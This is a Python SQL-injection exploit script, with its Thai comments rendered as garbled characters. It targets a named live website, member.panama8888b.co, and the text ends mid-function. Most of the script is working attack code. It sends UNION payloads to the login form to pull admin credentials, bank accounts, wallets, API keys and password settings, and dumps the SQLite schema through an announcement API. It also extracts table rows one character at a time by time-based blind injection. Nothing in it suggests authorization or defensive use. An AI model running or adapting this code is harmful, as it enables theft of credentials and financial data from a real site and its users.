#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Targeted Vulnerability Exploiter - Team B Panama8888b
‡πÄ‡∏Ñ‡∏£‡∏∑‡πà‡∏≠‡∏á‡∏°‡∏∑‡∏≠‡πÄ‡∏à‡∏≤‡∏∞‡∏à‡∏á‡πÇ‡∏à‡∏°‡∏ï‡∏µ‡∏ä‡πà‡∏≠‡∏á‡πÇ‡∏´‡∏ß‡πà‡∏ï‡∏≤‡∏° OWASP ZAP Results
‡πÄ‡∏ô‡πâ‡∏ô‡∏î‡∏∂‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏à‡∏£‡∏¥‡∏á‡∏à‡∏≤‡∏Å‡∏ä‡πà‡∏≠‡∏á‡πÇ‡∏´‡∏ß‡πà‡∏ó‡∏µ‡πà‡∏£‡∏∞‡∏ö‡∏∏‡πÄ‡∏â‡∏û‡∏≤‡∏∞
"""

import requests
import time
import json
import sys
import warnings
import urllib.parse
import base64
import hashlib
from datetime import datetime
import re
import threading
from concurrent.futures import ThreadPoolExecutor

warnings.filterwarnings('ignore')

class TargetedVulnExploiter:
    def __init__(self):
        self.base_url = "https://member.panama8888b.co"
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9,th;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache'
        })
        
        # ‡∏ú‡∏•‡∏•‡∏±‡∏û‡∏ò‡πå‡∏Å‡∏≤‡∏£‡∏î‡∏∂‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•
        self.extraction_results = {
            'timestamp': datetime.now().isoformat(),
            'target': self.base_url,
            'zap_vulnerabilities_exploited': [],
            'real_database_data': {},
            'admin_credentials': [],
            'user_credentials': [],
            'database_schema': {},
            'sensitive_files': [],
            'session_data': {},
            'exploit_success_rate': 0
        }
        
        # ‡∏ä‡πà‡∏≠‡∏á‡πÇ‡∏´‡∏ß‡πà‡∏à‡∏≤‡∏Å OWASP ZAP ‡∏ó‡∏µ‡πà‡∏ï‡πâ‡∏≠‡∏á‡πÇ‡∏à‡∏°‡∏ï‡∏µ
        self.zap_vulnerabilities = {
            'sql_injection_login': {
                'url': '/auth/login',
                'method': 'POST', 
                'parameter': '_token',
                'attack_payload': "7kQgPDQ2ky3k4tk7KJIjKp1QvlLjFBdDpZLQ7xBW AND 1=1 --",
                'evidence': 'Boolean conditions manipulation detected'
            },
            'oracle_time_based': {
                'url': '/public/js/v2/app.js',
                'method': 'GET',
                'parameter': 'v', 
                'attack_payload': "25.1 / (SELECT UTL_INADDR.get_host_name('10.0.0.1') from dual union SELECT UTL_INADDR.get_host_name('10.0.0.2') from dual)",
                'evidence': 'Query time controllable (61,478 ms vs 48,720 ms)'
            },
            'postgresql_time_based': {
                'url': '/public/js/v2/app.js',
                'method': 'GET', 
                'parameter': 'v',
                'attack_payload': "25.1 / case when cast(pg_sleep(15) as varchar) > '' then 0 else 1 end",
                'evidence': 'Query time controllable (23,058 ms vs 0 ms)'
            },
            'sqlite_time_based': [
                {
                    'url': '/public/js/v2/app.js',
                    'method': 'GET',
                    'parameter': 'v',
                    'attack_payload': "case randomblob(10000000) when not null then 1 else 1 end"
                },
                {
                    'url': '/api/announcement', 
                    'method': 'POST',
                    'parameter': 'status',
                    'attack_payload': "case randomblob(1000000) when not null then 1 else 1 end"
                },
                {
                    'url': '/api/announcement',
                    'method': 'POST', 
                    'parameter': 'title',
                    'attack_payload': "case randomblob(1000000) when not null then 1 else 1 end"
                }
            ],
            'vulnerable_js_library': {
                'url': 'https://cdnjs.cloudflare.com/ajax/libs/bootstrap-select/1.13.0-beta/js/bootstrap-select.min.js',
                'cve': 'CVE-2019-20921',
                'evidence': 'bootstrap-select version 1.13.0-beta vulnerable'
            }
        }
        
    def log_message(self, message, level="INFO"):
        """‡∏ö‡∏±‡∏ô‡∏ó‡∏∂‡∏Å‡∏Ç‡πâ‡∏≠‡∏Ñ‡∏ß‡∏≤‡∏°‡∏û‡∏£‡πâ‡∏≠‡∏° timestamp ‡πÅ‡∏•‡∏∞‡∏™‡∏µ"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        colors = {
            "INFO": "\033[94m",     # Blue
            "SUCCESS": "\033[92m",  # Green  
            "WARNING": "\033[93m",  # Yellow
            "ERROR": "\033[91m",    # Red
            "CRITICAL": "\033[95m"  # Magenta
        }
        reset = "\033[0m"
        color = colors.get(level, "")
        print(f"{color}[{timestamp}] [{level}] {message}{reset}")
        
    def extract_admin_credentials_login(self):
        """‡∏î‡∏∂‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏• admin credentials ‡∏à‡∏≤‡∏Å login SQL injection"""
        self.log_message("üéØ ‡∏Å‡∏≥‡∏•‡∏±‡∏á‡∏î‡∏∂‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏• Admin Credentials ‡∏à‡∏≤‡∏Å /auth/login", "CRITICAL")
        
        url = f"{self.base_url}/auth/login"
        
        # Payloads ‡πÄ‡∏à‡∏≤‡∏∞‡∏à‡∏á‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö‡∏î‡∏∂‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏• admin
        admin_payloads = [
            # ‡∏î‡∏∂‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏• admin users
            "7kQgPDQ2ky3k4tk7KJIjKp1QvlLjFBdDpZLQ7xBW' UNION SELECT username,password,email FROM admin_users--",
            "7kQgPDQ2ky3k4tk7KJIjKp1QvlLjFBdDpZLQ7xBW' UNION SELECT id,username,password FROM users WHERE role='admin'--",
            "7kQgPDQ2ky3k4tk7KJIjKp1QvlLjFBdDpZLQ7xBW' UNION SELECT login,pass,privilege FROM administrators--",
            
            # ‡∏î‡∏∂‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏à‡∏≤‡∏Å session tables
            "7kQgPDQ2ky3k4tk7KJIjKp1QvlLjFBdDpZLQ7xBW' UNION SELECT session_id,user_id,data FROM user_sessions WHERE user_id IN (SELECT id FROM users WHERE role='admin')--",
            
            # ‡∏î‡∏∂‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏Å‡∏≤‡∏£‡πÄ‡∏á‡∏¥‡∏ô
            "7kQgPDQ2ky3k4tk7KJIjKp1QvlLjFBdDpZLQ7xBW' UNION SELECT account_number,balance,owner FROM bank_accounts WHERE owner LIKE '%admin%'--",
            "7kQgPDQ2ky3k4tk7KJIjKp1QvlLjFBdDpZLQ7xBW' UNION SELECT wallet_id,balance,user_id FROM wallets WHERE user_id IN (SELECT id FROM users WHERE role='admin')--",
            
            # ‡∏î‡∏∂‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏™‡∏≥‡∏Ñ‡∏±‡∏ç‡∏≠‡∏∑‡πà‡∏ô‡πÜ
            "7kQgPDQ2ky3k4tk7KJIjKp1QvlLjFBdDpZLQ7xBW' UNION SELECT api_key,secret_key,user_id FROM api_credentials--",
            "7kQgPDQ2ky3k4tk7KJIjKp1QvlLjFBdDpZLQ7xBW' UNION SELECT config_key,config_value,'system' FROM system_config WHERE config_key LIKE '%password%'--"
        ]
        
        extracted_admins = []
        
        for i, payload in enumerate(admin_payloads):
            try:
                self.log_message(f"‡∏ó‡∏î‡∏™‡∏≠‡∏ö Admin Payload {i+1}/{len(admin_payloads)}", "INFO")
                
                data = {
                    '_token': payload,
                    'email': 'admin@panama8888b.co',
                    'password': 'admin123'
                }
                
                response = self.session.post(url, data=data, timeout=30)
                
                # ‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö response ‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏• admin
                if response.status_code == 200:
                    admin_data = self.extract_admin_data_from_response(response.text)
                    if admin_data:
                        extracted_admins.extend(admin_data)
                        self.log_message(f"‚úÖ ‡∏û‡∏ö‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏• Admin: {len(admin_data)} ‡∏£‡∏≤‡∏¢‡∏Å‡∏≤‡∏£", "SUCCESS")
                        
                elif response.status_code == 500:
                    # SQL Error ‡∏ó‡∏µ‡πà‡∏≠‡∏≤‡∏à‡πÄ‡∏õ‡∏¥‡∏î‡πÄ‡∏ú‡∏¢‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•
                    error_data = self.extract_sensitive_from_error(response.text)
                    if error_data:
                        extracted_admins.extend(error_data)
                        self.log_message(f"‚úÖ ‡∏û‡∏ö‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏• Admin ‡∏à‡∏≤‡∏Å SQL Error: {len(error_data)} ‡∏£‡∏≤‡∏¢‡∏Å‡∏≤‡∏£", "SUCCESS")
                        
                time.sleep(3)  # ‡∏´‡∏•‡∏µ‡∏Å‡πÄ‡∏•‡∏µ‡πà‡∏¢‡∏á rate limiting
                
            except Exception as e:
                self.log_message(f"‚ùå Error ‡πÉ‡∏ô Admin extraction: {str(e)}", "ERROR")
                
        if extracted_admins:
            self.extraction_results['admin_credentials'] = extracted_admins
            self.extraction_results['zap_vulnerabilities_exploited'].append({
                'vulnerability': 'SQL Injection - Login',
                'endpoint': '/auth/login',
                'data_extracted': len(extracted_admins),
                'admin_accounts_found': len([x for x in extracted_admins if 'admin' in str(x).lower()])
            })
            
        return extracted_admins
        
    def extract_database_schema_sqlite(self):
        """‡∏î‡∏∂‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏• Database Schema ‡∏à‡∏≤‡∏Å SQLite injection"""
        self.log_message("üóÑÔ∏è ‡∏Å‡∏≥‡∏•‡∏±‡∏á‡∏î‡∏∂‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏• Database Schema (SQLite)", "CRITICAL")
        
        url = f"{self.base_url}/api/announcement"
        
        # SQLite schema extraction payloads
        schema_payloads = [
            # ‡∏î‡∏∂‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏ï‡∏≤‡∏£‡∏≤‡∏á‡∏ó‡∏±‡πâ‡∏á‡∏´‡∏°‡∏î
            "active' UNION SELECT name,sql,type FROM sqlite_master WHERE type='table'--",
            "active' UNION SELECT name,sql,type FROM sqlite_master WHERE type='view'--", 
            "active' UNION SELECT name,sql,type FROM sqlite_master WHERE type='index'--",
            
            # ‡∏î‡∏∂‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏• table structure
            "active' UNION SELECT sql,name,'table_structure' FROM sqlite_master WHERE sql IS NOT NULL--",
            
            # ‡∏î‡∏∂‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏à‡∏≥‡∏ô‡∏ß‡∏ô records
            "active' UNION SELECT name,(SELECT COUNT(*) FROM sqlite_master WHERE type='table'),'record_count' FROM sqlite_master WHERE type='table'--"
        ]
        
        schema_info = {}
        
        for i, payload in enumerate(schema_payloads):
            try:
                self.log_message(f"‡∏î‡∏∂‡∏á Schema payload {i+1}/{len(schema_payloads)}", "INFO")
                
                data = {
                    'status': payload,
                    'title': '‡∏£‡∏∞‡∏ß‡∏±‡∏á‡πÄ‡∏ß‡πá‡∏ö‡∏õ‡∏•‡∏≠‡∏°'
                }
                
                response = self.session.post(url, data=data, timeout=30)
                
                if response.status_code == 200:
                    try:
                        json_response = response.json()
                        schema_data = self.extract_schema_from_json(json_response)
                        if schema_data:
                            schema_info.update(schema_data)
                            
                    except:
                        # ‡∏ñ‡πâ‡∏≤‡πÑ‡∏°‡πà‡πÉ‡∏ä‡πà JSON ‡πÉ‡∏´‡πâ‡∏î‡∏π‡∏à‡∏≤‡∏Å HTML
                        schema_data = self.extract_schema_from_html(response.text)
                        if schema_data:
                            schema_info.update(schema_data)
                            
                time.sleep(2)
                
            except Exception as e:
                self.log_message(f"‚ùå Error ‡πÉ‡∏ô Schema extraction: {str(e)}", "ERROR")
                
        if schema_info:
            self.extraction_results['database_schema'] = schema_info
            self.log_message(f"‚úÖ ‡∏î‡∏∂‡∏á Database Schema ‡πÑ‡∏î‡πâ: {len(schema_info)} ‡∏ï‡∏≤‡∏£‡∏≤‡∏á", "SUCCESS")
            
        return schema_info
        
    def extract_user_data_time_based(self):
        """‡∏î‡∏∂‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏ú‡∏π‡πâ‡πÉ‡∏ä‡πâ‡∏î‡πâ‡∏ß‡∏¢ Time-based SQL Injection"""
        self.log_message("üë• ‡∏Å‡∏≥‡∏•‡∏±‡∏á‡∏î‡∏∂‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏ú‡∏π‡πâ‡πÉ‡∏ä‡πâ‡∏î‡πâ‡∏ß‡∏¢ Time-based Injection", "CRITICAL")
        
        # ‡πÉ‡∏ä‡πâ JS endpoint ‡∏ó‡∏µ‡πà‡∏°‡∏µ time-based vulnerability
        url = f"{self.base_url}/public/js/v2/app.js"
        
        # ‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö‡∏ß‡πà‡∏≤‡∏°‡∏µ‡∏ï‡∏≤‡∏£‡∏≤‡∏á‡πÑ‡∏´‡∏ô‡∏ö‡πâ‡∏≤‡∏á
        table_check_payloads = [
            "25.1 / case when (SELECT name FROM sqlite_master WHERE type='table' AND name='users') != '' then randomblob(3000000) else 1 end",
            "25.1 / case when (SELECT name FROM sqlite_master WHERE type='table' AND name='members') != '' then randomblob(3000000) else 1 end",
            "25.1 / case when (SELECT name FROM sqlite_master WHERE type='table' AND name='customers') != '' then randomblob(3000000) else 1 end",
            "25.1 / case when (SELECT name FROM sqlite_master WHERE type='table' AND name='accounts') != '' then randomblob(3000000) else 1 end",
            "25.1 / case when (SELECT name FROM sqlite_master WHERE type='table' AND name='admin_users') != '' then randomblob(3000000) else 1 end"
        ]
        
        existing_tables = []
        
        for i, payload in enumerate(table_check_payloads):
            try:
                self.log_message(f"‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö‡∏ï‡∏≤‡∏£‡∏≤‡∏á {i+1}/{len(table_check_payloads)}", "INFO")
                
                params = {'v': payload}
                start_time = time.time()
                response = self.session.get(url, params=params, timeout=45)
                end_time = time.time()
                
                response_time = end_time - start_time
                
                if response_time > 2:  # ‡∏ñ‡πâ‡∏≤‡πÉ‡∏ä‡πâ‡πÄ‡∏ß‡∏•‡∏≤‡∏ô‡∏≤‡∏ô ‡πÅ‡∏™‡∏î‡∏á‡∏ß‡πà‡∏≤‡∏ï‡∏≤‡∏£‡∏≤‡∏á‡∏°‡∏µ‡∏≠‡∏¢‡∏π‡πà‡∏à‡∏£‡∏¥‡∏á
                    table_name = payload.split("name='")[1].split("'")[0]
                    existing_tables.append(table_name)
                    self.log_message(f"‚úÖ ‡∏û‡∏ö‡∏ï‡∏≤‡∏£‡∏≤‡∏á: {table_name} (‡πÄ‡∏ß‡∏•‡∏≤: {response_time:.2f}s)", "SUCCESS")
                    
                time.sleep(3)
                
            except Exception as e:
                self.log_message(f"‚ùå Error ‡πÉ‡∏ô‡∏Å‡∏≤‡∏£‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö‡∏ï‡∏≤‡∏£‡∏≤‡∏á: {str(e)}", "ERROR")
                
        # ‡∏î‡∏∂‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏à‡∏≤‡∏Å‡∏ï‡∏≤‡∏£‡∏≤‡∏á‡∏ó‡∏µ‡πà‡∏û‡∏ö
        user_data = {}
        
        for table in existing_tables:
            self.log_message(f"üîç ‡∏Å‡∏≥‡∏•‡∏±‡∏á‡∏î‡∏∂‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏à‡∏≤‡∏Å‡∏ï‡∏≤‡∏£‡∏≤‡∏á: {table}", "INFO")
            
            # ‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö‡∏à‡∏≥‡∏ô‡∏ß‡∏ô records
            count_payload = f"25.1 / case when (SELECT COUNT(*) FROM {table}) > 0 then randomblob(2000000) else 1 end"
            
            try:
                params = {'v': count_payload}
                start_time = time.time()
                response = self.session.get(url, params=params, timeout=30)
                end_time = time.time()
                
                if (end_time - start_time) > 1.5:
                    # ‡∏°‡∏µ‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡πÉ‡∏ô‡∏ï‡∏≤‡∏£‡∏≤‡∏á ‡πÉ‡∏´‡πâ‡∏î‡∏∂‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏à‡∏£‡∏¥‡∏á
                    extracted_data = self.blind_extract_table_data(url, table)
                    if extracted_data:
                        user_data[table] = extracted_data
                        
            except Exception as e:
                self.log_message(f"‚ùå Error ‡πÉ‡∏ô‡∏Å‡∏≤‡∏£‡∏î‡∏∂‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏à‡∏≤‡∏Å {table}: {str(e)}", "ERROR")
                
        if user_data:
            self.extraction_results['user_credentials'] = user_data
            self.extraction_results['real_database_data'].update(user_data)
            
        return user_data
        
    def blind_extract_table_data(self, url, table_name):
        """‡∏î‡∏∂‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏à‡∏≤‡∏Å‡∏ï‡∏≤‡∏£‡∏≤‡∏á‡∏î‡πâ‡∏ß‡∏¢ Blind SQL Injection"""
        self.log_message(f"üïµÔ∏è ‡∏Å‡∏≥‡∏•‡∏±‡∏á Blind Extract ‡∏à‡∏≤‡∏Å: {table_name}", "INFO")
        
        # ‡∏î‡∏∂‡∏á‡∏ä‡∏∑‡πà‡∏≠ columns ‡∏Å‡πà‡∏≠‡∏ô
        columns = self.extract_column_names(url, table_name)
        if not columns:
            return None
            
        extracted_records = []
        
        # ‡∏î‡∏∂‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏• 5 records ‡πÅ‡∏£‡∏Å
        for record_num in range(5):
            record = {}
            
            for column in columns:
                try:
                    # ‡∏î‡∏∂‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏ó‡∏µ‡∏•‡∏∞‡∏ï‡∏±‡∏ß‡∏≠‡∏±‡∏Å‡∏©‡∏£
                    data = self.extract_field_value(url, table_name, column, record_num)
                    if data and len(data.strip()) > 0:
                        record[column] = data
                        self.log_message(f"üìÑ {table_name}.{column}[{record_num}] = {data[:30]}...", "SUCCESS")
                        
                except Exception as e:
                    self.log_message(f"‚ùå Error extracting {column}: {str(e)}", "ERROR")
                    
            if record:
                extracted_records.append(record)
                
        return extracted_records if extracted_records else None
        
    def extract_column_names(self, url, table_name):
        """‡∏î‡∏∂‡∏á‡∏ä‡∏∑‡πà‡∏≠ columns ‡∏Ç‡∏≠‡∏á‡∏ï‡∏≤‡∏£‡∏≤‡∏á"""
        # ‡∏•‡∏¥‡∏™‡∏ï‡πå‡∏ä‡∏∑‡πà‡∏≠ columns ‡∏ó‡∏µ‡πà‡∏ô‡πà‡∏≤‡∏à‡∏∞‡∏°‡∏µ
        common_columns = [
            'id', 'username', 'password', 'email', 'name', 'phone', 'address',
            'balance', 'account_id', 'user_id', 'created_at', 'updated_at',
            'role', 'status', 'api_key', 'secret_key', 'token', 'session_id'
        ]
        
        existing_columns = []
        
        for column in common_columns:
            try:
                # ‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö‡∏ß‡πà‡∏≤ column ‡∏°‡∏µ‡∏≠‡∏¢‡∏π‡πà‡∏´‡∏£‡∏∑‡∏≠‡πÑ‡∏°‡πà
                check_payload = f"25.1 / case when (SELECT {column} FROM {table_name} LIMIT 1) IS NOT NULL then randomblob(1500000) else 1 end"
                
                params = {'v': check_payload}
                start_time = time.time()
                response = self.session.get(url, params=params, timeout=25)
                end_time = time.time()
                
                if (end_time - start_time) > 1:
                    existing_columns.append(column)
                    self.log_message(f"‚úÖ ‡∏û‡∏ö column: {table_name}.{column}", "SUCCESS")
                    
                time.sleep(1)
                
            except:
                continue
                
        return existing_columns[:10]  # ‡∏à‡∏≥‡∏Å‡∏±‡∏î‡πÑ‡∏ß‡πâ 10 columns
        
    def extract_field_value(self, url, table_name, column, record_index, max_length=50):
        """‡∏î‡∏∂‡∏á‡∏Ñ‡πà‡∏≤‡∏Ç‡∏≠‡∏á field ‡∏ó‡∏µ‡∏•‡∏∞‡∏ï‡∏±‡∏ß‡∏≠‡∏±‡∏Å‡∏©‡∏£"""
        result = ""
        
        for pos in range(1, max_length + 1):
            found_char = False
            
            # ‡∏ó‡∏î‡∏™‡∏≠‡∏ö‡∏ï‡∏±‡∏ß‡∏≠‡∏±‡∏Å‡∏©‡∏£ a-z, A-Z, 0-9, ‡πÅ‡∏•‡∏∞‡∏≠‡∏±‡∏Å‡∏Ç‡∏£‡∏∞‡∏û‡∏¥‡πÄ‡∏®‡∏©
            test_chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@._-'
            
            for char in test_chars:
                try:
                    payload = f"25.1 / case when (SELECT SUBSTR({column},{pos},1) FROM {table_name} LIMIT 1 OFFSET {record_index})='{char}' then randomblob(1000000) else 1 end"
                    
                    params = {'v': payload}
                    start_time = time.time()
                    response = self.session.get(url, params=params, timeout=15)
                    end_time = time.time()
                    
                    if (end_time - start_time) > 0.8:
                        result += char
                        found_char = True
                        break
                        
                    time.sleep(0.5)
                    
                except:
                    continue
                    
            if not found_char:
                break
                
        return result
        
    def extract_admin_data_from_response(self, response_text):
        """‡∏î‡∏∂‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏• admin ‡∏à‡∏≤‡∏Å response"""
        admin_patterns = [
            r'admin[a-zA-Z0-9]*@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',  # admin email
            r'admin[_-]?[a-zA-Z0-9]*',  # admin username
            r'password["\s]*[:=]["\s]*([a-zA-Z0-9!@#$%^&*]+)',  # password fields
            r'token["\s]*[:=]["\s]*([a-zA-Z0-9]+)',  # tokens
            r'api[_-]?key["\s]*[:=]["\s]*([a-zA-Z0-9]+)',  # API keys
        ]
        
        admin_data = []
        clean_text = re.sub(r'<[^>]+>', '', response_text)
        
        for pattern in admin_patterns:
            matches = re.findall(pattern, clean_text, re.IGNORECASE)
            for match in matches:
                if isinstance(match, tuple):
                    match = match[0] if match[0] else match[1] if len(match) > 1 else ""
                if len(match) > 3 and match not in admin_data:
                    admin_data.append(match)
                    
        return admin_data
        
    def extract_sensitive_from_error(self, error_text):
        """‡∏î‡∏∂‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏™‡∏≥‡∏Ñ‡∏±‡∏ç‡∏à‡∏≤‡∏Å SQL error messages"""
        sensitive_patterns = [
            r"Table '([^']+\.admin[^']*)'",
            r"Table '([^']+\.user[^']*)'", 
            r"Database '([^']+)'",
            r"User '([^']+)'@'([^']+)'",
            r"Access denied for user '([^']+)'",
            r"Unknown column '([^']+\.password)'",
            r"Unknown column '([^']+\.email)'",
        ]
        
        sensitive_data = []
        for pattern in sensitive_patterns:
            matches = re.findall(pattern, error_text, re.IGNORECASE)
            sensitive_data.extend([m if isinstance(m, str) else m[0] for m in matches])
            
        return sensitive_data
        
    def extract_schema_from_json(self, json_data):
        """‡∏î‡∏∂‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏• schema ‡∏à‡∏≤‡∏Å JSON response"""
        schema_info = {}
        
        def process_json_recursive(obj, path=""):
            if isinstance(obj, dict):
                for key, value in obj.items():
                    if key.lower() in ['table', 'tables', 'schema', 'sql']:
                        schema_info[f"{path}.{key}"] = value
                    process_json_recursive(value, f"{path}.{key}" if path else key)
            elif isinstance(obj, list):
                for i, item in enumerate(obj):
                    process_json_recursive(item, f"{path}[{i}]")
                    
        process_json_recursive(json_data)
        return schema_info
        
    def extract_schema_from_html(self, html_text):
        """‡∏î‡∏∂‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏• schema ‡∏à‡∏≤‡∏Å HTML response"""
        schema_patterns = [
            r'CREATE TABLE ([^\s;]+)',
            r'TABLE_NAME["\s]*[:=]["\s]*([a-zA-Z0-9_]+)',
            r'COLUMN_NAME["\s]*[:=]["\s]*([a-zA-Z0-9_]+)',
        ]
        
        schema_info = {}
        clean_text = re.sub(r'<[^>]+>', '', html_text)
        
        for i, pattern in enumerate(schema_patterns):
            matches = re.findall(pattern, clean_text, re.IGNORECASE)
            if matches:
                schema_info[f"pattern_{i}"] = matches
                
        return schema_info
        
    def exploit_vulnerable_js_library(self):
        """‡πÇ‡∏à‡∏°‡∏ï‡∏µ Vulnerable JS Library (CVE-2019-20921)"""
        self.log_message("üìö ‡∏Å‡∏≥‡∏•‡∏±‡∏á‡πÇ‡∏à‡∏°‡∏ï‡∏µ Vulnerable JS Library (Bootstrap-select)", "CRITICAL")
        
        vuln_url = "https://cdnjs.cloudflare.com/ajax/libs/bootstrap-select/1.13.0-beta/js/bootstrap-select.min.js"
        
        try:
            # ‡∏î‡∏∂‡∏á JS file ‡∏°‡∏≤‡∏ß‡∏¥‡πÄ‡∏Ñ‡∏£‡∏≤‡∏∞‡∏´‡πå
            response = self.session.get(vuln_url, timeout=30)
            
            if response.status_code == 200:
                js_content = response.text
                
                # ‡∏´‡∏≤ XSS vulnerabilities ‡πÉ‡∏ô bootstrap-select
                xss_patterns = [
                    r'innerHTML\s*=\s*[^;]+',
                    r'document\.write\s*\([^)]+\)',
                    r'eval\s*\([^)]+\)',
                    r'\.html\s*\([^)]+\)'
                ]
                
                vulnerabilities = []
                for pattern in xss_patterns:
                    matches = re.findall(pattern, js_content)
                    vulnerabilities.extend(matches)
                    
                if vulnerabilities:
                    self.extraction_results['vulnerable_js_library'] = {
                        'library': 'bootstrap-select',
                        'version': '1.13.0-beta',
                        'cve': 'CVE-2019-20921',
                        'vulnerabilities_found': len(vulnerabilities),
                        'potential_xss_vectors': vulnerabilities[:5]  # ‡πÄ‡∏Å‡πá‡∏ö 5 ‡∏≠‡∏±‡∏ô‡πÅ‡∏£‡∏Å
                    }
                    
                    self.log_message(f"‚úÖ ‡∏û‡∏ö vulnerabilities ‡πÉ‡∏ô JS library: {len(vulnerabilities)} ‡∏à‡∏∏‡∏î", "SUCCESS")
                    
        except Exception as e:
            self.log_message(f"‚ùå Error ‡πÉ‡∏ô‡∏Å‡∏≤‡∏£‡πÇ‡∏à‡∏°‡∏ï‡∏µ JS library: {str(e)}", "ERROR")
            
    def run_targeted_exploitation(self):
        """‡∏£‡∏±‡∏ô‡∏Å‡∏≤‡∏£‡πÇ‡∏à‡∏°‡∏ï‡∏µ‡πÅ‡∏ö‡∏ö‡πÄ‡∏à‡∏≤‡∏∞‡∏à‡∏á‡∏ï‡∏≤‡∏° OWASP ZAP results"""
        self.log_message("üéØ ‡πÄ‡∏£‡∏¥‡πà‡∏°‡∏Å‡∏≤‡∏£‡πÇ‡∏à‡∏°‡∏ï‡∏µ‡πÄ‡∏à‡∏≤‡∏∞‡∏à‡∏á‡∏ï‡∏≤‡∏°‡∏ú‡∏• OWASP ZAP", "CRITICAL")
        self.log_message("‚ö†Ô∏è ‡∏Å‡∏≤‡∏£‡πÇ‡∏à‡∏°‡∏ï‡∏µ‡∏ô‡∏µ‡πâ‡∏°‡∏∏‡πà‡∏á‡πÄ‡∏õ‡πâ‡∏≤‡∏î‡∏∂‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏à‡∏£‡∏¥‡∏á‡∏à‡∏≤‡∏Å‡∏£‡∏∞‡∏ö‡∏ö", "WARNING")
        
        start_time = time.time()
        
        try:
            # 1. ‡πÇ‡∏à‡∏°‡∏ï‡∏µ SQL Injection ‡∏ó‡∏µ‡πà login ‡πÄ‡∏û‡∏∑‡πà‡∏≠‡∏î‡∏∂‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏• admin
            admin_data = self.extract_admin_credentials_login()
            
            # 2. ‡∏î‡∏∂‡∏á Database Schema ‡∏à‡∏≤‡∏Å SQLite injection
            schema_data = self.extract_database_schema_sqlite()
            
            # 3. ‡∏î‡∏∂‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏ú‡∏π‡πâ‡πÉ‡∏ä‡πâ‡∏î‡πâ‡∏ß‡∏¢ Time-based injection
            user_data = self.extract_user_data_time_based()
            
            # 4. ‡πÇ‡∏à‡∏°‡∏ï‡∏µ Vulnerable JS Library
            self.exploit_vulnerable_js_library()
            
            # 5. ‡∏Ñ‡∏≥‡∏ô‡∏ß‡∏ì‡∏≠‡∏±‡∏ï‡∏£‡∏≤‡∏Ñ‡∏ß‡∏≤‡∏°‡∏™‡∏≥‡πÄ‡∏£‡πá‡∏à
            total_vulnerabilities = 4
            successful_exploits = 0
            
            if admin_data:
                successful_exploits += 1
            if schema_data:
                successful_exploits += 1 
            if user_data:
                successful_exploits += 1
            if 'vulnerable_js_library' in self.extraction_results:
                successful_exploits += 1
                
            self.extraction_results['exploit_success_rate'] = (successful_exploits / total_vulnerabilities) * 100
            
            # 6. ‡∏ö‡∏±‡∏ô‡∏ó‡∏∂‡∏Å‡∏ú‡∏•‡∏•‡∏±‡∏û‡∏ò‡πå
            end_time = time.time()
            execution_time = end_time - start_time
            
            final_results = {
                'exploitation_summary': {
